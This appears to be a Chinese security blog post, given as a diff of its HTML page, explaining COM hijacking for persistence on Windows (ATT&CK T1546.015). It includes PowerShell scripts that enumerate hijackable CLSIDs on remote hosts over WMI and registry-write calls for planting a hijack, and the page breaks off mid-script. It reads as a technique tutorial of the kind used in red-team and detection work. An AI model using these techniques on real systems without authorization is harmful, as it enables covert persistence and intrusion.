@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="HaCky的安全备忘录" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0x00 前言&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在ATT&amp;amp;CK框架中，持久性方面，攻击者使用计划任务，或者服务作为持久性的相关技术，但很少看到编号为T1546.015的COM组件劫持相关的利用。本文行文仓促，如有错误，请各位积极指正。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从COM劫持到COR_PROFILE">
+<meta property="og:url" content="https://findream.github.io/2022/09/05/从COM劫持到COR_PROFILE/index.html">
+<meta property="og:site_name" content="HaCky的安全备忘录">
+<meta property="og:description" content="0x00 前言&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在ATT&amp;amp;CK框架中，持久性方面，攻击者使用计划任务，或者服务作为持久性的相关技术，但很少看到编号为T1546.015的COM组件劫持相关的利用。本文行文仓促，如有错误，请各位积极指正。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://hacky.wang/blog/20210920/P43NEgPNW9EL.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210920/k6qYbCXnNJvB.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210920/Rzusce0AqME6.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210920/szT6x3nmagkt.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210920/PkrmMDx4i6ws.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210920/Wk5UNmASVDLs.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210920/h7O0dgshVlzi.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210920/TAbrxTd7xPlV.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210920/tbizlxJnYyFA.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210920/Rz6XFlEt0Bg6.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20211005/3JKfkpYaFTJY.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210921/6rFLehVCg4mc.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210921/1lpY8WoHrekm.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210921/ohNMS7W9rOIv.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20210921/uYsAivClAq6Y.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20211005/K08WVetYhU3z.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20211005/fzQ5I6OHFkVG.png?imageslim">
+<meta property="og:updated_time" content="2022-11-12T06:57:41.551Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="从COM劫持到COR_PROFILE">
+<meta name="twitter:description" content="0x00 前言&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在ATT&amp;amp;CK框架中，持久性方面，攻击者使用计划任务，或者服务作为持久性的相关技术，但很少看到编号为T1546.015的COM组件劫持相关的利用。本文行文仓促，如有错误，请各位积极指正。">
+<meta name="twitter:image" content="http://hacky.wang/blog/20210920/P43NEgPNW9EL.png?imageslim">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://findream.github.io/2022/09/05/从COM劫持到COR_PROFILE/"/>
+
+
+
+
+
+  <title>从COM劫持到COR_PROFILE | HaCky的安全备忘录</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">HaCky的安全备忘录</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://findream.github.io/2022/09/05/从COM劫持到COR_PROFILE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="HaCky">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="HaCky的安全备忘录">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">从COM劫持到COR_PROFILE</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-09-05T15:02:11+08:00">
+                2022-09-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在ATT&amp;CK框架中，持久性方面，攻击者使用计划任务，或者服务作为持久性的相关技术，但很少看到编号为T1546.015的COM组件劫持相关的利用。本文行文仓促，如有错误，请各位积极指正。</p>
+<a id="more"></a>
+<h2 id="0x01-COM劫持"><a href="#0x01-COM劫持" class="headerlink" title="0x01 COM劫持"></a>0x01 COM劫持</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;COM劫持是一种通过劫持COM引用和关系的一种持久性手段，COM劫持是通过修改注册表相关内容来实现替换合法COM组件的引用。</p>
+<h3 id="0x1-1-COM模型"><a href="#0x1-1-COM模型" class="headerlink" title="0x1.1 COM模型"></a>0x1.1 COM模型</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Component Object Model 译为组件对象模型，是一种独立于语言的一种二进制操作模型，攻击者通常使用组件对象模型(即COM)来执行本地代码。由于COM组件是语言独立的。所以，这些接口经常通过各种语言调用来进行代码执行，以及无文件下载以及持久性等诸多隐秘的操作，而被滥用。通常通过指定CLSID（标识GUID）或ProgID（程序标识符）来获得COM对象。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在0x01 COM劫持一节中，简略的介绍了COM劫持的基本原理，即通过修改注册表相关内容来实现替换合法COM组件的引用。因为COM都通过CLSID标识，这些CLSID数据大多存储在注册表<code>HKEY_CLASSES_ROOT\CLSID</code>,<code>HKEY_CURRENT_USER\Software\Classes\CLSID</code>,以及<code>HKEY_LOCAL_MACHINE\Software\Classes\CLSID</code>中。在CLSID中，和COM劫持相关的键主要有<code>InprocServer32</code>和<code>LocalServer32</code>。所以，从狭义上来说，COM劫持主要是通过修改<code>InprocServer32</code>和<code>LocalServer32</code>的值来实现的。<br>   <img src="http://hacky.wang/blog/20210920/P43NEgPNW9EL.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InprocServer32主要存储的是一个*.dll的路径，当实例化一个COM后，就会将InprocServer32存储对的Dll文件加载入实例化该COM的进程中，而LocalServer32存储的是一个.exe的路径，当实例化COM之后，便会以一个进程形式存在。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当查询CLSID的时候，windows首先会查找<code>HKEY_CURRENT_USER\Software\Classes\CLSID</code>存储的CLSID，当该键不存在的情况下，也会依次查询<code>HKEY_CLASSES_ROOT\CLSID</code>和<code>HKEY_LOCAL_MACHINE\Software\Classes\CLSID</code>。<br>  <img src="http://hacky.wang/blog/20210920/k6qYbCXnNJvB.png?imageslim" alt="mark"></p>
+<h3 id="0x1-2-Hunting-COM"><a href="#0x1-2-Hunting-COM" class="headerlink" title="0x1.2 Hunting COM"></a>0x1.2 Hunting COM</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在0x1.1中，简单的介绍了COM劫持的基本原理，现在的问题是如何寻找可以被利用的COM?一般的搜索COM有以下三个原则：</p>
+<ul>
+<li>增加缺少的CLSID的路径</li>
+<li>修改原有的CLSID加载的程序</li>
+<li>修改原有的CLSID加载的路径</li>
+</ul>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<a href="https://pentestlab.blog/2020/05/20/persistence-com-hijacking/" target="_blank" rel="external">Persistence – COM Hijacking</a>这篇文章中，简略的介绍了如何搜寻可以被利用的COM组件。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过Persistence–COM Hijacking的描述，首先将ProcMon设定为</p>
+<ul>
+<li>操作是RegOpenKey</li>
+<li>结果是NAME NOT FOUND</li>
+<li>路径以 InprocServer32 结尾<br> <img src="http://hacky.wang/blog/20210920/Rzusce0AqME6.png?imageslim" alt="mark"></li>
+</ul>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，劫持一些系统组件/进程实例化的一些COM，能更好的持久化，也能增加被劫持的几率。这里我选择Explorer.EXE进程。Explorer.EXE是一个常见的系统进程，其作用是管理windows系统的相关资源，通过多次的尝试，对UI的一些操作可能是Explorer.EXE通过COM来实现的。<br>··<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过ProcMon筛选的结果，可以选择<code>{B41DB860-8EE4-11D2-9906-E49FADC173CA}</code>这个COM服务器进行劫持。可以看到注册表<code>HKCU\Software\Classes\CLSID\</code>下并不存在<code>{B41DB860-8EE4-11D2-9906-E49FADC173CA}</code>这样的键<br>  <img src="http://hacky.wang/blog/20210920/szT6x3nmagkt.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后在<code>HKCU\Software\Classes\CLSID\</code>下新建上述的CLSID，并设置InProcServer32的路径为COM注入的dll的路径，如下图。此处为了演示效果，仅仅进行一次弹窗而已。<br>  <img src="http://hacky.wang/blog/20210920/PkrmMDx4i6ws.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在下一次重启之后，便可触发COM劫持实现驻留。<br>  <img src="http://hacky.wang/blog/20210920/Wk5UNmASVDLs.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是，COM劫持的另一个大原则是不能干扰原进程的正常运行，看一个例子，同样的针对Explorer.exe进程，当我打开我的计算机的时候，可以看到先是读取了<code>HKCU\Software\Classes\CLSID\{11DBB47C-A525-400B-9E80-A54615A090C0}\InProcServer32</code>。同样的，新建一个有个CLSID键。虽然在打开我的电脑会被劫持。但是会出现这样的情况。所以这不是一个好的劫持对象。<br>   <img src="http://hacky.wang/blog/20210920/h7O0dgshVlzi.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Persistence – COM Hijacking还提到了工具acCOMplice，可以寻找缺失COM服务器的CLSID，但是在验证这个的时候发现。在部分的CLSID的LocalServer32或者InProcServer32键中可以不存在相关的值。例如<code>{00020812-0000-0000-C000-000000000046}</code>。<br>   <img src="http://hacky.wang/blog/20210920/TAbrxTd7xPlV.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以使用如下的脚本遍历注册表中不存在路径的CLSID<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> Get-MissRegValue_Clsid</div><div class="line">&#123;</div><div class="line">    <span class="keyword">Param</span></div><div class="line">    (</div><div class="line">        [System.Management.Automation.PSCredential]<span class="variable">$Credential</span>,</div><div class="line">        [string]<span class="variable">$ComputerName</span>,</div><div class="line">        <span class="variable">$HK</span>,</div><div class="line">        [string]<span class="variable">$strKeyPath</span>,</div><div class="line">        [string]<span class="variable">$eachSubKey</span></div><div class="line">    )</div><div class="line">     <span class="variable">$Clsid</span> = <span class="string">""</span></div><div class="line">     <span class="comment"># 拼接路径</span></div><div class="line">     <span class="variable">$KeyPath</span> = <span class="variable">$strKeyPath</span> + <span class="string">"\"</span> + <span class="variable">$eachSubKey</span></div><div class="line">        </div><div class="line">     <span class="comment"># 此处最好是获取他的子键的名字[LocalServer32 or InprocServer32]</span></div><div class="line">     <span class="variable">$Server32Names</span> = Get-Server32Name -Credential <span class="variable">$Credential</span> -ComputerName <span class="variable">$ComputerName</span> -HK <span class="variable">$HK</span>  -strKeyPath <span class="variable">$KeyPath</span></div><div class="line">     <span class="keyword">if</span>(<span class="variable">$Server32Names</span> <span class="nomarkup">-eq</span> <span class="literal">$null</span>)</div><div class="line">     &#123;</div><div class="line">          <span class="keyword">return</span> </div><div class="line">     &#125;</div><div class="line">     <span class="keyword">ForEach</span>(<span class="variable">$Server32Name</span> <span class="keyword">in</span> <span class="variable">$Server32Names</span>)</div><div class="line">     &#123;</div><div class="line">          <span class="variable">$KeyPath2</span> = <span class="variable">$KeyPath</span> + <span class="string">"\"</span> + <span class="variable">$Server32Name</span></div><div class="line">          <span class="variable">$ValueName</span> = <span class="string">""</span></div><div class="line">         </div><div class="line">          <span class="variable">$strRegValue</span> = <span class="built_in">Invoke-WmiMethod</span> -ComputerName <span class="variable">$ComputerName</span> -Credential <span class="variable">$Credential</span> -class StdRegProv -Name GetStringValue -ArgumentList <span class="variable">$HK</span>,<span class="variable">$KeyPath2</span>,<span class="variable">$ValueName</span></div><div class="line">          <span class="keyword">if</span>(<span class="variable">$strRegValue</span>.sValue <span class="nomarkup">-eq</span> <span class="literal">$null</span>)</div><div class="line">          &#123;</div><div class="line">               <span class="variable">$Clsid</span> = <span class="variable">$eachSubKey</span></div><div class="line">               <span class="built_in">Write-Output</span> <span class="string">"Missing Value Of LocalServer32 or InprocServer32 ---&gt;$&#123;Clsid&#125;"</span></div><div class="line">          &#125;</div><div class="line">          <span class="keyword">if</span>(<span class="variable">$strRegValue</span>.sValue <span class="nomarkup">-ne</span> <span class="literal">$null</span>)</div><div class="line">          &#123;</div><div class="line">               <span class="variable">$Clsid</span> = <span class="variable">$eachSubKey</span></div><div class="line">               <span class="variable">$ComPath</span> = <span class="variable">$strRegValue</span>.sValue</div><div class="line">               <span class="built_in">Write-Host</span> <span class="string">"[*]running:$&#123;KeyPath2&#125;-----&gt;$&#123;ComPath&#125; "</span></div><div class="line">          &#125;   </div><div class="line">     &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Hunting COM 这篇文章中，展示了利用powershell实例化COM对象的例子。主要是<code>[activator]::CreateInstance([type]::GetTypeFromCLSID($Clsid))</code>进行实例化的。当修改注册表的InprocServer32的路径之后，这种COM 是很难被触发的。但是可以通过上述手动触发。<br>    <img src="http://hacky.wang/blog/20210920/tbizlxJnYyFA.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当在win7(x64)或者win10下，按照上述的操作，发现并不能进行COM劫持。并抛出HRESULT:0x800700C1的异常。通过<a href="https://stackoverflow.com/questions/50519154/net-4-0-winform-could-not-load-file-or-assembly-or-one-of-its-dependencies-i" target="_blank" rel="external">https://stackoverflow.com/questions/50519154/net-4-0-winform-could-not-load-file-or-assembly-or-one-of-its-dependencies-i</a>发现，这是由于自身编译的.dll文件是32位的，但是系统却是64位的，当编译出x64的dll之后，便可触发。<br>    <img src="http://hacky.wang/blog/20210920/Rz6XFlEt0Bg6.png?imageslim" alt="mark"></p>
+<h3 id="0x1-3-如何利用-COM-Hiject"><a href="#0x1-3-如何利用-COM-Hiject" class="headerlink" title="0x1.3 如何利用 COM Hiject"></a>0x1.3 如何利用 COM Hiject</h3><h3 id="0x1-4-远程COM-Hiject"><a href="#0x1-4-远程COM-Hiject" class="headerlink" title="0x1.4 远程COM Hiject"></a>0x1.4 远程COM Hiject</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bohops在<a href="https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/" target="_blank" rel="external">滥用 COM 注册表结构</a>一文中，利用<code>$inproc = gwmi Win32_COMSetting | ?{ $_.LocalServer32 -ne $null }</code>来枚举可能造成文件缺失的“LocalServer32”路径，这给我以启示，可以利用Get-WmiObject等WMI方法来枚举所有的COM。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如下，是Find-MissLibraryComByGet-WmiObject可以远程获取可能被劫持的LoacalServer32和InprocServer32。利用如下WQL语句<code>Query = &quot;Select Name From CIM_DataFile Where Name = &#39;$RemoteFilePath&#39;&quot;</code>判断文件是否存在。由此可以劫持文件不存在的COM。<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> Find-MissLibraryComByGet-WmiObject</div><div class="line">&#123;</div><div class="line">    <span class="keyword">Param</span></div><div class="line">    (</div><div class="line">        [System.Management.Automation.PSCredential]<span class="variable">$Credential</span>,</div><div class="line">        [string]<span class="variable">$ComputerName</span></div><div class="line">    )</div><div class="line">    <span class="variable">$ComSetting</span> = <span class="built_in">Get-WmiObject</span> -ComputerName <span class="variable">$ComputerName</span> -Credential <span class="variable">$Credential</span> -class Win32_ComSetting</div><div class="line">    <span class="keyword">ForEach</span>(<span class="variable">$_</span> <span class="keyword">in</span> <span class="variable">$ComSetting</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="variable">$_</span>.LocalServer32 <span class="nomarkup">-ne</span> <span class="literal">$null</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="variable">$Server32</span> = <span class="variable">$_</span>.LocalServer32</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(<span class="variable">$_</span>.InprocServer32 <span class="nomarkup">-ne</span> <span class="literal">$null</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="variable">$Server32</span> = <span class="variable">$_</span>.InprocServer32</div><div class="line">        &#125;</div><div class="line">        <span class="variable">$ClSid</span> = <span class="variable">$_</span>.ComponentId       </div><div class="line">        <span class="keyword">if</span>((<span class="variable">$ClSid</span> <span class="nomarkup">-ne</span> <span class="literal">$null</span>) -and (<span class="variable">$Server32</span> <span class="nomarkup">-ne</span> <span class="literal">$null</span>))</div><div class="line">        &#123;            </div><div class="line">            <span class="comment"># 清楚路径上的多余数据</span></div><div class="line">            <span class="variable">$Server32</span> = Clear-Server32(<span class="variable">$Server32</span>)</div><div class="line">            <span class="built_in">Write-Host</span> <span class="string">"[*]running:$&#123;Clsid&#125;-----&gt;<span class="variable">$Server32</span> "</span>           </div><div class="line">            <span class="comment"># 判断文件是否存在</span></div><div class="line">            <span class="keyword">if</span>((IsRemoteFileExist -ComputerName <span class="variable">$ComputerName</span> -Credential <span class="variable">$Credential</span> -RemoteFilePath <span class="variable">$Server32</span>) <span class="nomarkup">-eq</span> <span class="literal">$False</span>)</div><div class="line">            &#123;</div><div class="line">                <span class="built_in">Write-Output</span> <span class="string">"[!]Missing File Of LocalServer32 or InprocServer32: $&#123;Clsid&#125;---&gt;$&#123;Server32&#125;"</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在CLSID下还有一个特殊的键，名为“TreatAs”,其作为CLSID的一个软连接，当实例化一个含有TreatAs键的COM时，首先会读取原CLSID的数据，如果存在TreatAs键的时候，便读取TreatAs键的值，然后读取第二个CLSID，根据情况加载第二个CLSID的exe或者dll。<br>  <img src="http://hacky.wang/blog/20211005/3JKfkpYaFTJY.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如此的话，此时通常会有两个攻击面，第一，可以修改TreatAs的值，从而将其劫持到一个非法的CLSID。第二，可以劫持TreatAs所对应的CLSID。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当检索系统中可能存在劫持可能的CLSID之后，就可以通过修改注册表实现COM劫持。WMI也存在修改注册表的方法。WMI的StdRegProv类提供了多个读取，遍历，修改注册表数据的函数。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用 <code>GetStringValue</code>函数获取键值的值<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">$regvalue</span> = Invoke-WmiMethod -<span class="keyword">class</span> StdRegProv -Name GetStringValue -ArgumentList <span class="built_in">$HKCU</span>,<span class="built_in">$RegKey</span>,<span class="built_in">$RegName</span></div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<code>CreateKey</code>函数创建键<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">$regcreatekey</span> = Invoke-WmiMethod -<span class="keyword">class</span> StdRegProv -Name CreateKey -ArgumentList <span class="built_in">$HKCU</span>,<span class="built_in">$RegKey</span></div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<code>SetStringValue</code>函数设置键的值<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">$regsetvalue</span> = Invoke-WmiMethod -<span class="keyword">Class</span> StdRegProv -Name SetStringValue -ArgumentList <span class="built_in">$HKCU</span>,<span class="built_in">$RegKey</span>,<span class="built_in">$RegValue</span>,<span class="built_in">$RegName</span></div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<code>EnumKey</code>检索项下面所有键<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Invoke-WmiMethod -ComputerName <span class="built_in">$ComputerName</span> -Credential <span class="built_in">$Credential</span> -<span class="keyword">class</span> StdRegProv -Name EnumKey -ArgumentList <span class="built_in">$HK</span>,<span class="built_in">$strKeyPath</span></div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如下通过远程设置注册表来COM劫持<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div 